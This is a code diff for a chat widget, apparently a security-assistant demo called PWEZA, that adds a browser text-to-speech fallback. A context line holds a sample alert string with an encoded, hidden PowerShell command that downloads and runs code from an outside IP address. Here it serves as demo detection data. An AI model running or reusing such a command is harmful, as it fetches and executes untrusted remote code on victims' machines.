@@ -20,6 +20,21 @@ type Msg = {
 // Same sample as the server's SAMPLE_ALERT: Word spawning hidden, encoded PowerShell that calls out to a Tor exit node.
 const SAMPLE_ALERT = '2026-11-20T03:14:07Z host=WS-0142 user=jdoe EventID=4688 process=powershell.exe parent=winword.exe cmdline="powershell -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOAA1AC4AMgAyADAALgAxADAAMQAuADQAMgAvAGEAJwApAA==" dest_ip=185.220.101.42'
 
+/** Backup voice: the browser's own speech, used only if PWEZA's voice can't be fetched. */
+function browserSpeak(text: string, onEnd: () => void) {
+  try {
+    const synth = window.speechSynthesis
+    if (!synth) return onEnd()
+    synth.cancel()
+    const u = new SpeechSynthesisUtterance(text.replace(/\s*\[\d+\]/g, '').slice(0, 900))
+    const voices = synth.getVoices()
+    u.voice = voices.find((v) => /Christopher|Guy|Daniel|Alex|Google UK English Male/i.test(v.name)) || voices.find((v) => v.lang.startsWith('en')) || null
+    u.rate = 0.98; u.pitch = 0.85
+    u.onend = onEnd; u.onerror = onEnd
+    synth.speak(u)
+  } catch { onEnd() }
+}
+
 /** The tracker's long-lived visitor id (for "welcome back" memory). */
 function visitorId(): string {
   try { return JSON.parse(localStorage.getItem('pa-visitor') || 'null')?.id || '' } catch { return '' }
@@ -186,7 +201,7 @@ export default function AIChat() {
     window.addEventListener('pweza:toggle', toggle)
     return () => window.removeEventListener('pweza:toggle', toggle)
   }, [])
-  useEffect(() => { if (!open) { audioRef.current?.pause(); recRef.current?.stop?.(); talkRef.current = false; setTalk(false); setFull(false) } }, [open])
+  useEffect(() => { if (!open) { try { window.speechSynthesis?.cancel() } catch {} audioRef.current?.pause(); recRef.current?.stop?.(); talkRef.current = false; setTalk(false); setFull(false) } }, [open])
 
   const send = async (text: string, opts: { mode?: 'demo'; label?: string } = {}) => {
     const q = text.trim()
@@ -217,7 +232,10 @@ export default function AIChat() {
         if (!audio && text) {
           try { audio = (await fetch('/api/chat/speak', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ text }) }).then((r) => r.json())).audio } catch { /* fall through */ }
         }
-        if (!audio) { if (talkRef.current) setTimeout(() => listen(true), 400); return }
+        if (!audio) {
+          const resume = () => { if (talkRef.current) setTimeout(() => listen(true), 300) }
+          return text ? browserSpeak(text, resume) : resume()
+        }
         audioRef.current?.pause()
         audioRef.current = new Audio(audio)
         // Hands-free talk mode: when PWEZA finishes speaking, listen again.
@@ -316,7 +334,7 @@ export default function AIChat() {
     try {
       recRef.current?.stop?.()
       const { audio } = await fetch('/api/chat/speak', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ text }) }).then((r) => r.json())
-      if (!audio) return
+      if (!audio) return browserSpeak(text, () => { if (talkRef.current) listen(true) })
       audioRef.current?.pause()
       audioRef.current = new Audio(audio)
       audioRef.current.onended = () => { if (talkRef.current) listen(true) }
